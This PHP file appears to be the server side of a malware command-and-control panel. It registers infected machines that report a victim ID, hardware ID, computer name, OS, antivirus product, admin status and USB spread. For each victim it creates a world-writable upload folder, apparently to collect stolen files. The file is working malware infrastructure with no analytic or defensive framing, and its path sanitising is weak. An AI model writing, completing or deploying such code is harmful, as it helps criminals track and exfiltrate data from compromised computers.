<?php
include_once 'classes/Database.php';
include_once APP_PATH . '/classes/Clients.php';
include_once APP_PATH . '/classes/Utils.php';
include_once APP_PATH . "/vendor/geoip/geoip2.phar";
use GeoIp2\Database\Reader;

$utils = new Utils;

$client = new Clients;

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $ipaddress = $utils->sanitize($_SERVER['REMOTE_ADDR']);
    $country = getConteryCode($ipaddress);
    $date = date("Y-m-d");
    $post_data = $_POST['data'];
    $data = explode(DATA_SPLITTER, $utils->base64_decode_url($post_data));

    $clientdata = [
        'vicid' => $data[0],
        'hwid' => strtoupper(sha1($data[1])),
        'ipaddress' => $ipaddress,
        'computername' => $data[2],
        'country' => $country,
        'os' => $data[3],
        'insdate' => $date,
        'update_at' => date("m/d/Y H:i:s", time()),
        'pings' => 0,
        'antivirus' => $data[4],
        'version' => $data[5],
        'status' => $data[6],
        'is_usb' => $data[7],
        'is_admin' => $data[8],
    ];

    $client->newClient($clientdata);

    if (isset($data) && !empty($data)) {
        new_dir($utils->sanitize($data[0]));
    }
}

function getConteryCode($ipaddress)
{
    $localhost = ['localhost', '127.0.0.1', '::1'];
    $reader = new Reader(APP_PATH . '/vendor/geoip/GeoLite2-City.mmdb');

    if (!in_array($ipaddress, $localhost)) {
        $record = $reader->city($ipaddress);
    }

    if (isset($record)) {
        return strtolower($record->country->isoCode);
    } else {
        return "X";
    }
}

function new_dir($victimID)
{
    $utils = new Utils;

    if (strpos($victimID, '../') !== false) {
        $victimID = $utils->sanitize(trim($victimID, "../"));
    }

    try {
        @mkdir(realpath("upload") . "/" . $victimID);
        @copy(realpath("upload/index.php"), "upload" . "/" . $victimID . "/" . "index.php");
        @copy(realpath("upload/.htaccess"), "upload" . "/" . $victimID . "/" . ".htaccess");
        @chmod("upload" . "/" . $victimID . "/", 0777);
    } catch (Exception $e) {
        return $e->getMessage();
    }
}
